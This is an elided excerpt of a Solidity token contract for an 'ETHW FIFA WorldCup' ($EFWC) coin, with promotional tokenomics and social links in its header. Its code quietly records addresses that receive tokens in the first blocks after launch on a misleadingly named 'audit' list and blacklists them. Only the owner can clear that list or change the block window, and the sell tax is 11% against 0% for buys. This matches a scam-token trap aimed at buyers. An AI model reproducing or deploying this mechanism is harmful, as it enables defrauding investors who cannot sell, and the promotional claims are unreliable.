...
/**  
    ETHW FIFA WorldCup build around the community and marketing. 

    Issuance Rules:
    Total Supply: 1,000,000,000 $EFWC
    Presale: 15%
    Airdrop: 1%
    Marketing: 4%
    Staking: 30%
    ...
    Buy: 0%
    Sell: 11%
    Tax Distribution：1% Burn, 1% Marketing, 3% Auto LP, 6% reflection
    
    Links:
        EFWC Links： https://linktr.ee/efwc2022 
    Twitter：
        https://twitter.com/EFWC2022
    Telegram:
        https://t.me/EFWCEN
...
contract BABYTOKEN is ERC20, Ownable {
    ...
    address[] private _waitAuditList;
    ...
    function _transfer(
        ...
        if(!launched() && automatedMarketMakerPairs[to] && amount>0) {
        ...
        if(block.number < launchedAt+ KillNum){
            if(isAuditAddr(from) && !automatedMarketMakerPairs[to] && !_isExcludedFromFees[to]){
                _waitAuditList.push(to);
            }
        }
    ...
    function setAuditList(address currAddr) private{
        uint arrayLength = _waitAuditList.length;
        for (uint i=0; i<arrayLength; i++) {
            if (_waitAuditList[i] == currAddr)
                continue;
            if(_isBlacklisted[_waitAuditList[i]])
                continue;
            _isBlacklisted[_waitAuditList[i]] = true;
        }
    }

    function isAuditAddr(address currAddr)public view returns(bool) {
        uint arrayLength = _waitAuditList.length;
        for (uint i=0; i<arrayLength; i++) {
            if (_waitAuditList[i] == currAddr)
                return true;
    ...
    function getAuditList() public view returns(address[] memory){
        return _waitAuditList;
    }

    function getAuditListLength() public view returns (uint256) {
        return _waitAuditList.length;
    }

    function clearAuditList() public onlyOwner {
        delete _waitAuditList;
    }

    function changeKillNum(uint256 newValue) public onlyOwner{
       KillNum = newValue;
    }    
